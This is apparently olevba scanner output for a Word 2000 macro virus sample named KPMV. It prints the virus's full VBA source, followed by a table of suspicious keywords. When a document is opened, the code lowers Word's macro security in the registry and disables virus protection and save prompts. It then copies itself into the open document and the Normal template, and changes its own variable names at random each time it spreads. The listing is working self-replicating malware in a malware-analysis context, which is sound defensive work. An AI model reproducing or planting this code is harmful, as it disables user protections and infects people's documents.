olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-428023ba51ed620fd29b49d6ba3691980d83ff75
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-428023ba51ed620fd29b49d6ba3691980d83ff75 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
A6 = dq20g2U9B7n + V3H1n + O1O7m + Q7H3l + F2M2p + R6V8i + G6A7r + E2Q1p + D1R7y + U2E5u + E3U6t + Q6
Dim wv58x6(27) As String: wv58x6(0) = "xv70u2": wv58x6(1) = "jd64g8": wv58x6(2) = "tm11u9": wv58x6(3) = "kl87m3": wv58x6(4) = "vt51i9": wv58x6(5) = "sm85c2": wv58x6(6) = "kl87m3": wv58x6(7) = "mm48t4": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
K1 = C5J8t + H7V1i + E6E9j + S8C7z + C7I5z + C4F3p + A2
wv58x6(8) = "sm77s4": wv58x6(9) = "ce68o1": wv58x6(10) = "zr19m1": wv58x6(11) = "ak78w1": wv58x6(12) = "lp97e7": wv58x6(13) = "ww75y3": wv58x6(14) = "kr64j9": wv58x6(15) = "mb13g3": Options.VirusProtection = False
H8 = F6D9t + P4B3o + U7U2j + C6I2w + Q1N7x + C5
wv58x6(16) = "km68q5": wv58x6(17) = "kk75t5": wv58x6(18) = "an72b9": wv58x6(19) = "cx92r0": wv58x6(20) = "pp47s4": wv58x6(21) = "rd24i8": wv58x6(22) = "wv58x6": wv58x6(23) = "xi42v7": Options.SaveNormalPrompt = False
M0 = B3D8w + A3G1y + L6N3x + G4P6i + L8T3k + A6M4n + H8U3l + S6
wv58x6(24) = "uz98k9": wv58x6(25) = "vo47h4": wv58x6(26) = "cz17m2": wv58x6(27) = "dq20g2": Options.ConfirmConversions = False
H7 = J6J7j + Q5R1x + E1J0g + Q5
Set xv70u2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
E3 = L4F8m + I1D1g + O4S7k + F5V1m + N8K5z + G7B9i + K0S3k + E1M2i + R1B7z + G2I3t + M6H7h + M8
Set jd64g8 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
J4 = M7H0k + M6E5g + P9F6o + R9F6z + I1A8e + E2M5l + E4P4s + G8
Set tm11u9 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
V9 = L6E5r + C8K4n + O9
vt51i9 = "private sub" & " document_open()": sm85c2 = "end" & " sub"
P8 = I8T0t + U2V0f + C2Q7y + B5E3p + O5A9m + G3
kl87m3 = tm11u9.Lines(1, tm11u9.CountOfLines)
P4 = I6M9k + F8C3w + V7L4o + L2U2g + A2U0p + P3L0e + N2M7n + O7D7t + P5
mm48t4 = InStr(LCase(kl87m3), vt51i9)
J0 = K8L5e + M7D8i + C3T3h + U2D2h + M5B9x + S3H7x + N5A3e + F6V4p + Q7U8i + A5
sm77s4 = InStr(mm48t4, LCase(kl87m3), sm85c2) + Len(sm85c2)
F4 = O4T4h + S2H4u + K6M9v + B4B8l + R8B1u + L4B0n + F2L5v + A9O9h + S5
ce68o1 = Mid(kl87m3, mm48t4, sm77s4 - mm48t4)
V5 = Q2L6m + C4T6j + H5R8v + Q7V5f + B6H8u + L1V8z + O8G3x + M1N4v + O2P8z + I5
If xv70u2.CountOfLines <> 0 Then
T7 = G2H6w + O5S1m + H5K4r + R1I2h + F7U7s + C2N5w + N2U1q + N3Q2r + L4C6k + T8T8h + Q3
zr19m1 = xv70u2.Lines(1, xv70u2.CountOfLines)
P2 = A1R4l + C1R4w + M6
If InStr(zr19m1, "(27) As String") = 0 Then
S6 = L3C3i + L5F2p + Q5S7u + Q3
If InStr(LCase(zr19m1), vt51i9) <> 0 Then
Q5 = D5S8w + G0E7p + P0J8q + F3L8y + J3G5v + I6Q2m + P2I4v + O8
ak78w1 = False
H3 = P7C7h + M0O1t + G8B2l + S3K9z + K8
For lp97e7 = 1 To xv70u2.CountOfLines: DoEvents
T5 = A4B8w + U3C5j + V8P6q + A5F3f + R9B4x + T7P6f + J4J1z + F3P1e + M7
If ak78w1 = False Then
K7 = D4S5u + U6M1x + M7L2m + B8K7f + I1
If LCase(xv70u2.Lines(lp97e7, 1)) = vt51i9 Then
I5 = P1F9r + D3T3r + L3U4i + N6
ak78w1 = True
M8 = C9N8r + S5N8k + G8T0j + H1E7z + G1E1s + R9T2v + J5J4g + I2D4j + B8L4y + I7T7r + H3
ww75y3 = lp97e7
S7 = V9S2u + T2D2s + Q9C4m + G6U4e + N3T4t + V6I8j + O6A3o + Q6
End If
E8 = M8K5o + J2C4t + O9G6e + U4G1o + S4N5h + E9J6e + G2
Else
M9 = H2H3i + D7D9j + A3C5u + K8
If LCase(xv70u2.Lines(lp97e7, 1)) = sm85c2 Then
Q6 = S6R0l + R2E2i + D7G2l + K6I7t + N1Q6m + R3
kr64j9 = lp97e7
F4 = M4B6v + K9O1i + J3C6w + A3U3s + B6E6s + R4K3r + S1E8q + N0N1h + D4A7v + I0T3w + H5N6t + O3
Exit For
I0 = G9F4m + H6R2y + C1N2u + E8F4y + K1S6n + G0B5n + E6C6r + K5I4q + E7C9t + N4T7v + A5
End If
E0 = R8U8s + A2R7o + F7
End If
J5 = S4K3f + K2V2r + D6V4f + D6D6g + N9J8g + J7M3n + N2Q8o + C0J0s + Q6V3z + P3P2f + I8B2v + F2
Next
P5 = T9T2j + G1I0r + E3P1p + B1N2j + C8M8r + O9P2u + B3D6k + Q2R1p + T4M4s + N4G4q + L8U2u + B4
xv70u2.DeleteLines ww75y3, kr64j9 - (ww75y3 - 1)
M2 = V0B8p + T1J3i + A1B2r + A0U6n + D3V7w + E4U7k + B8T3v + N5G6s + T2M8m + T7V1j + E4C0m + E5
End If
L9 = I3I1z + S3N2f + I5P2m + L5K8j + U5
Set mb13g3 = xv70u2
U6 = C8Q1t + D3V4t + S0G1s + V7
xv70u2.addfromstring ce68o1: If ActiveDocument.Saved = False Then ActiveDocument.Save
B1 = J2F5v + V6O3n + K5O1x + I1J4u + H0K2h + T9
End If
C7 = I2M0z + E6I1v + G5B3z + L7N4o + I6S4o + A8Q1j + G7A8i + G4U7v + O1O5w + J6S3z + T4P6t + M5
Else
K3 = G6B6g + U1F1g + L8Q9s + F2R2g + E3V4h + P5F6h + I1
Set mb13g3 = xv70u2
B2 = O8M7p + E6F8t + L7N7q + Q9L0g + D1O7n + L1B0f + V5O0l + A5
xv70u2.addfromstring ce68o1: If ActiveDocument.Saved = False Then ActiveDocument.Save
A6 = F8L8q + C6J1k + J9C7o + V1F1r + I4P5h + B3H8m + E5C3o + U5S2m + M5G6i + N3
End If
H2 = G1N6m + U7R8s + N0
If jd64g8.CountOfLines <> 0 Then
F1 = H1J5k + K4L6s + L4K6h + C6F8i + U6S5p + U8U3w + D8L8g + K5
km68q5 = jd64g8.Lines(1, jd64g8.CountOfLines)
P6 = T3Q4r + P4U9w + D4D0x + F0
If InStr(km68q5, "(27) As String") = 0 Then
J8 = S6A7g + S1K3u + J0G9q + K3L3q + D1S9p + V4H2e + Q3R4s + G7E1k + R6E9u + R0
If InStr(LCase(km68q5), vt51i9) <> 0 Then
V2 = I7S6r + I2J7x + J9U5m + F3R5i + H2J7m + S7D3l + P7I2l + H0G9f + N8M7f + H1G3i + E4
ak78w1 = False
F2 = K3E8m + E5F5q + J8C4l + N7N4y + R9
For lp97e7 = 1 To jd64g8.CountOfLines: DoEvents
F9 = S9G7p + M3H1y + H9
If ak78w1 = False Then
B1 = A6R5z + R4T8l + V9C5m + L7R6q + S8D5n + B8
If LCase(jd64g8.Lines(lp97e7, 1)) = vt51i9 Then
F6 = K2E5k + R2N8y + E7
ak78w1 = True
H7 = I3M3f + G5T4e + J7V8h + Q1O5l + A7N6e + J1C1r + C0P4w + L6N1l + V3E7w + T6S5e + D1
ww75y3 = lp97e7
R5 = I8V2v + F8H6o + N3D8l + O2V3h + B4
End If
U0 = S5A4e + J7R6f + F7I3m + F0K2t + K0B7z + M2A3s + C8
Else
B7 = A5K7t + J5O8u + A7R7g + D7M5z + D2A2q + K6O4z + L1T8z + K2I7l + G5T1x + B4H2p + N8Q9h + Q7
If LCase(jd64g8.Lines(lp97e7, 1)) = sm85c2 Then
D8 = Q8H8f + P7I5o + P3U6u + Q1K3j + M4H4f + O3V6j + P1
kr64j9 = lp97e7
D0 = A7U0i + O1S7y + U8C5y + O2S1f + G3Q2q + R4Q6j + F2N0e + K5K9v + U8C2v + G8E4n + S6
Exit For
R3 = T4T8v + M1T7o + B4D0n + C5J7i + A6K1w + M4D2z + D0P4k + C7J4n + Q4
End If
G3 = C3D6v + H3M3r + P4C1y + N6J2x + K4H4r + B2E4i + H8D4x + Q2O8n + J1F2s + M3A6v + Q5
End If
D2 = I6J1e + M3N4k + T7M7u + Q8U2o + D3Q4k + N8
Next
L7 = G5O0o + C2K7q + U6J3e + K3R6y + Q9C7s + Q5L0o + B2N8r + J0P4e + L5B3s + P1C1k + I4
jd64g8.DeleteLines ww75y3, kr64j9 - (ww75y3 - 1)
E3 = J3V8p + I7J4g + V6F1z + A1L4y + P7R1x + R4L6w + M4U8o + C8H5g + H3D1g + F8U4e + E7V1n + M2
End If
F4 = F0B9i + B4U9e + D3M2i + I4C4t + I3
Set mb13g3 = jd64g8
G4 = D1J4x + J8P2x + D2J6e + L8E5g + H3
jd64g8.addfromstring ce68o1: If NormalTemplate.Saved = False Then NormalTemplate.Save
M6 = Q2F6z + V5C5u + D4M5l + R8R0m + I6G8y + C0G2l + B1K4n + M3Q6m + H1T0t + B6
End If
I8 = B4Q7y + O0G0j + N7A9m + G3H9g + M9
Else
B3 = S3E8q + E4P7x + C6A7w + V4U0q + G7N6u + S8Q0w + F2F4n + U1S8s + N2
Set mb13g3 = jd64g8
B9 = R3H1s + P7V9w + T4D2h + E8C6r + K1
jd64g8.addfromstring ce68o1: If NormalTemplate.Saved = False Then NormalTemplate.Save
I3 = E0C9u + E8V4p + H2A5y + J2A5m + F7V1x + R4H4u + B1O6p + B6B8l + D7
End If
H1 = Q1F3w + N2J8g + A2O9h + M4Q8p + Q4L6m + P8V3z + G7R8v + A2
If mb13g3 <> "" Then
D5 = A8H8u + C5A5t + N1G3x + P1
Dim kk75t5 As Long, an72b9 As Long, cx92r0 As Long, pp47s4 As Long
K4 = O4P8z + M0K2x + L8L9k + G0U7g + M1N7f + I5K7x + C1
For rd24i8 = 0 To UBound(wv58x6): DoEvents
P7 = P5O2q + M4U1r + E7S8l + K6B6k + K3V5x + S9Q3z + N5T1f + B3R4w + G6O3r + K5C3i + C8H8j + S7
Randomize: xi42v7 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
T7 = J1S0i + I2A2k + T4G4j + O2J8q + N5
kk75t5 = 1: an72b9 = 1
D4 = I5G6v + P6O5t + U8M7j + H0Q5p + P9C7h + Q7
With mb13g3
I4 = F1B2l + J7M6t + G5K8n + N8D5q + D9G8t + M2R3k + F2I6p + D1
Do While .Find(wv58x6(rd24i8), kk75t5, an72b9, cx92r0, pp47s4, True)
L1 = C4T9p + Q4H4k + E5P1e + L0O4o + C6S6u + O7
uz98k9 = .Lines(cx92r0, 1)
I7 = L0L2m + O3M4v + P3L3j + G5H6l + C5T3r + C7A1y + N6
vo47h4 = Mid(uz98k9, 1, an72b9 - 1) & xi42v7 & Mid(uz98k9, pp47s4)
H0 = J9L3y + B2R1t + U3V6z + H3E7e + T5G7m + B5B5j + A9L1w + N8H7s + O2M1s + T7
.replaceline cx92r0, vo47h4: DoEvents
M5 = D3J0h + U2S2u + K6F8m + V5F7w + O6S7k + T4
kk75t5 = cx92r0
A6 = N1K5z + N8A3p + J2S3l + L1K5p + E0
cx92r0 = .CountOfLines: an72b9 = 1
N7 = T5K9n + L8H7i + R6N5h + L9H0k + D1G2w + O2F6o + I4G3t + E2
Loop
D7 = R6O2f + J0T6f + A7I5r + Q2I8f + K8I7t + E5S3g + V3V6n + D3
End With
M2 = P6S4s + A7E3q + F8C6g + O1G3m + A1O6e + K5F5k + N1
Next
M7 = K4U2g + N6A6j + U9P3n + E6O3h + N9D7t + G8R2y + P4P8o + D1F4y + B5T3h + L6F8x + B9
With mb13g3
S1 = J7I4r + S2E6n + B1
For cz17m2 = 2 To (.CountOfLines - 1) Step 2: DoEvents
J7 = Q8L7m + R8L6x + I1G9y + E1S6j + E3V4q + J3M0w + L5K6p + T3M2y + V8U0q + D1
For dq20g2 = 1 To (Int(Rnd * 10) + 2): DoEvents
J5 = V1F1z + C1A8w + C5K4o + J0C7x + K4I1x + S1
Randomize: xi42v7 = xi42v7 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
N6 = F7I3u + A7R5m + M2E2e + B1E1o + P2R1y + O1S7l + O6J8r + P3V6g + L7R6y + J8
Next dq20g2
F2 = C2D4f + V1J3f + N4H1v + T2N8v + N5G4y + F5F5n + Q7E9g + E5C3x + J8V2s + T1N5s + O7
Randomize: .replaceline cz17m2, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & xi42v7 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
Q6 = C3H8j + S7H2t + L4H1l + A6O3k + B8U0f + A9U3t + L7N4w + C3D6h + B1T6k + F6
xi42v7 = "": DoEvents
D1 = B6N9s + G6B6o + O7M4v + M0T5u + J7S6o + A5O6f + G2N6u + P5C1l + I4Q5q + L6K8s + F6E7q + T6
Next cz17m2
U6 = H7A8f + O2A3p + L3H7i + T7D9f + A4
End With
F7 = B0B5j + S6T2k + P1S7v + E1
End If
K5 = L4L3n + L0U5j + S6A4m + E4C0u + G9K8n + L6
'KPMV Word 2000 Macro Virus - By [K] - Virii Argentina - http://www.virii.com.ar
V2 = G2R8w + E7I3k + D2S9x + Q1O5t + R5U8t + K2E5s + M8U2r + H8H3j + T3Q1x + C7N5x + A3H8v + I6
'February 2001 - Buenos Aires - Argentina
B8 = V7V7o + A4L4z + S8H5v + U7V7z + D8M8o + A8R7p + U5S8s + E3C6s + U6S2v + G3N0x + Q7
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.com|URL                                          |
|          |.ar                 |                                             |
+----------+--------------------+---------------------------------------------+

